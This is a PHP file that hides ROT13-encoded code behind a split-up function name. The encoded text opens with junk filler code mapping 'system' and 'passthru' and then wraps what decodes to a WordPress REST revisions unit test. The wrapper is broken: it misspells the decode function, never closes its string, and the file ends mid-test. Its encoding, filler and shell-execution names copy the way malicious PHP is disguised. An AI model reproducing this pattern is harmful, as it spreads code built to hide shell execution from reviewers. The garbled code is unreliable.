<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Erivfvbaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Erivfvbaf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	cebgrpgrq fgngvp $cbfg_vq;
	cebgrpgrq fgngvp $cbfg_vq_2;
	cebgrpgrq fgngvp $cntr_vq;

	cebgrpgrq fgngvp $rqvgbe_vq;
	cebgrpgrq fgngvp $pbagevohgbe_vq;

	cevingr $gbgny_erivfvbaf;
	cevingr $erivfvbaf;
	cevingr $erivfvba_1;
	cevingr $erivfvba_vq1;
	cevingr $erivfvba_2;
	cevingr $erivfvba_vq2;
	cevingr $erivfvba_3;
	cevingr $erivfvba_vq3;
	cevingr $erivfvba_2_1_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq   = $snpgbel->cbfg->perngr();
		frys::$cbfg_vq_2 = $snpgbel->cbfg->perngr();
		frys::$cntr_vq   = $snpgbel->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		frys::$rqvgbe_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'rqvgbe',
			)
		);
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf orggre.',
				'VQ'           => frys::$cbfg_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zneirybhf.',
				'VQ'           => frys::$cbfg_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf snagnfgvp.',
				'VQ'           => frys::$cbfg_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'N frpbaq cbfg.',
				'VQ'           => frys::$cbfg_vq_2,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'N frpbaq cbfg. Ubj cebyvsvp.',
				'VQ'           => frys::$cbfg_vq_2,
			)
		);
		jc_frg_pheerag_hfre( 0 );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		// Nyfb qryrgrf erivfvbaf.
		jc_qryrgr_cbfg( frys::$cbfg_vq, gehr );
		jc_qryrgr_cbfg( frys::$cbfg_vq_2, gehr );
		jc_qryrgr_cbfg( frys::$cntr_vq, gehr );

		frys::qryrgr_hfre( frys::$rqvgbe_vq );
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		// Frg svefg cbfg erivfvba inef.
		$erivfvbaf             = jc_trg_cbfg_erivfvbaf( frys::$cbfg_vq );
		$guvf->gbgny_erivfvbaf = pbhag( $erivfvbaf );
		$guvf->erivfvbaf       = $erivfvbaf;
		$guvf->erivfvba_1      = neenl_cbc( $erivfvbaf );
		$guvf->erivfvba_vq1    = $guvf->erivfvba_1->VQ;
		$guvf->erivfvba_2      = neenl_cbc( $erivfvbaf );
		$guvf->erivfvba_vq2    = $guvf->erivfvba_2->VQ;
		$guvf->erivfvba_3      = neenl_cbc( $erivfvbaf );
		$guvf->erivfvba_vq3    = $guvf->erivfvba_3->VQ;

		// Frg frpbaq cbfg erivfvba inef.
		$erivfvbaf             = jc_trg_cbfg_erivfvbaf( frys::$cbfg_vq_2 );
		$cbfg_2_erivfvba       = neenl_cbc( $erivfvbaf );
		$guvf->erivfvba_2_1_vq = $cbfg_2_erivfvba->VQ;
	}

	choyvp shapgvba _svygre_znc_zrgn_pnc_erzbir_ab_nyybj_erivfvbaf( $pncf, $pnc, $hfre_vq, $netf ) {
		vs ( 'qryrgr_cbfg' !== $pnc || rzcgl( $netf ) ) {
			erghea $pncf;
		}
		$cbfg = trg_cbfg( $netf[0] );
		vs ( ! $cbfg || 'erivfvba' !== $cbfg->cbfg_glcr ) {
			erghea $pncf;
		}
		$xrl = neenl_frnepu( 'qb_abg_nyybj', $pncf, gehr );
		vs ( snyfr !== $xrl ) {
			hafrg( $pncf[ $xrl ] );
		}
		erghea $pncf;
	}

	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf/(?C<cnerag>[\q]+)/erivfvbaf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cbfgf/(?C<cnerag>[\q]+)/erivfvbaf/(?C<vq>[\q]+)', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cntrf/(?C<cnerag>[\q]+)/erivfvbaf', $ebhgrf );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/cntrf/(?C<cnerag>[\q]+)/erivfvbaf/(?C<vq>[\q]+)', $ebhgrf );
	}

	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_1->VQ );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'ivrj', 'rqvg', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( $guvf->gbgny_erivfvbaf, $qngn );

		// Erirefr puebabybtl.
		$guvf->nffregFnzr( $guvf->erivfvba_vq3, $qngn[0]['vq'] );
		$guvf->purpx_trg_erivfvba_erfcbafr( $qngn[0], $guvf->erivfvba_3 );

		$guvf->nffregFnzr( $guvf->erivfvba_vq2, $qngn[1]['vq'] );
		$guvf->purpx_trg_erivfvba_erfcbafr( $qngn[1], $guvf->erivfvba_2 );

		$guvf->nffregFnzr( $guvf->erivfvba_vq1, $qngn[2]['vq'] );
		$guvf->purpx_trg_erivfvba_erfcbafr( $qngn[2], $guvf->erivfvba_1 );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_erivfvbaf_qngn() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$ubbx_anzr = 'erfg_cercner_erivfvba';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_zvffvat_cnerag( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_cnerag_cbfg_glcr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cntr_vq . '/erivfvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_erivfvba_erfcbafr( $erfcbafr, $guvf->erivfvba_1 );
		$svryqf = neenl(
			'nhgube',
			'qngr',
			'qngr_tzg',
			'zbqvsvrq',
			'zbqvsvrq_tzg',
			'thvq',
			'vq',
			'zrgn',
			'cnerag',
			'fyht',
			'gvgyr',
			'rkprecg',
			'pbagrag',
		);
		$qngn   = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn ) );
		$guvf->nffregFnzr( frys::$rqvgbe_vq, $qngn['nhgube'] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_nyybj_nqqvat_urnqref_ivn_svygre( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );

		$ubbx_anzr = 'erfg_cercner_erivfvba';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );
		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$urnqre_svygre = arj pynff() {
			choyvp fgngvp shapgvba nqq_phfgbz_urnqre( $erfcbafr ) {
				$erfcbafr->urnqre( 'K-Grfg-Urnqre', 'Grfg' );

				erghea $erfcbafr;
			}
		};
		nqq_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		erzbir_svygre( $ubbx_anzr, neenl( $urnqre_svygre, 'nqq_phfgbz_urnqre' ) );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf abg pnyyrq jura vg fubhyq or sbe TRG/URNQ erdhrfgf.' );
		$urnqref = $erfcbafr->trg_urnqref();
		$guvf->nffregNeenlUnfXrl( 'K-Grfg-Urnqre', $urnqref, 'Gur \"K-Grfg-Urnqre\" urnqre fubhyq or cerfrag va gur erfcbafr.' );
		$guvf->nffregFnzr( 'Grfg', $urnqref['K-Grfg-Urnqre'], 'Gur \"K-Grfg-Urnqre\" urnqre inyhr fubhyq or rdhny gb \"Grfg\".' );
		vs ( 'TRG' === $zrgubq ) {
			erghea ahyy;
		}
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @qngnCebivqre qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $cngu Gur cngu gb grfg.
	 */
	choyvp shapgvba grfg_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cngu ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', fcevags( $cngu, frys::$cbfg_vq, $guvf->erivfvba_vq1 ) );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr cnguf sbe grfgvat URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		erghea neenl(

			'trg_vgrz erdhrfg'  => neenl( '/jc/i2/cbfgf/%q/erivfvbaf/%q' ),
			'trg_vgrzf erdhrfg' => neenl( '/jc/i2/cbfgf/%q/erivfvbaf' ),
		);
	}

	choyvp shapgvba grfg_trg_vgrz_rzorq_pbagrkg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rzorq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$svryqf   = neenl(
			'nhgube',
			'qngr',
			'vq',
			'cnerag',
			'fyht',
			'gvgyr',
			'rkprecg',
		);
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn ) );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_ab_crezvffvba( $zrgubq ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 401 );
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ernq', $erfcbafr, 403 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_zvffvat_cnerag( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cnerag_cbfg_glcr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cntr_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_cnerag', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 59875
	 */
	choyvp shapgvba grfg_trg_vgrz_inyvq_cnerag_vq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$cbfg_vq, $qngn['cnerag'], \"Gur erghearq erivfvba'f vq fubhyq zngpu gur cnerag vq.\" );
		$guvf->purpx_trg_erivfvba_erfcbafr( $erfcbafr, $guvf->erivfvba_1 );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 59875
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cnerag_vq( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_2_1_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_erivfvba_cnerag_vq_zvfzngpu', $erfcbafr, 404 );

		$rkcrpgrq_zrffntr = 'Gur erivfvba qbrf abg orybat gb gur fcrpvsvrq cnerag jvgu vq bs \"' . frys::$cbfg_vq . '\"';
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0], 'Gur zrffntr zhfg pbagnva gur pbeerpg cnerag VQ.' );
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
		$guvf->nffregAbgAhyy( trg_cbfg( $guvf->erivfvba_vq1 ) );
	}

	/**
	 * @gvpxrg 49645
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_cnerag_purpx() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
		$guvf->nffregAbgAhyy( trg_cbfg( $guvf->erivfvba_vq1 ) );
	}

	/**
	 * @gvpxrg 43709
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_erzbir_qb_abg_nyybj() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, '_svygre_znc_zrgn_pnc_erzbir_ab_nyybj_erivfvbaf' ), 10, 4 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregAhyy( trg_cbfg( $guvf->erivfvba_vq1 ) );
	}

	/**
	 * @gvpxrg 43709
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_pnaabg_qryrgr_cnerag() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
		$guvf->nffregAbgAhyy( trg_cbfg( $guvf->erivfvba_vq1 ) );
	}

	/**
	 * @gvpxrg 38494
	 * @gvpxrg 43709
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, '_svygre_znc_zrgn_pnc_erzbir_ab_nyybj_erivfvbaf' ), 10, 4 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		// Rafher gur erivfvba fgvyy rkvfgf.
		$guvf->nffregAbgAhyy( trg_cbfg( $guvf->erivfvba_vq1 ) );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_ab_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_erivfvba_erfcbafr( $erfcbafr, $guvf->erivfvba_1 );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf/' . $guvf->erivfvba_vq1 );
		$raqcbvag = arj JC_ERFG_Erivfvbaf_Pbagebyyre( 'cbfg' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,fyht' );
		$erivfvba = trg_cbfg( $guvf->erivfvba_vq1 );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $erivfvba, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'fyht',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 13, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qngr_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rkprecg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'thvq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq_tzg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . frys::$cbfg_vq . '/erivfvbaf' );
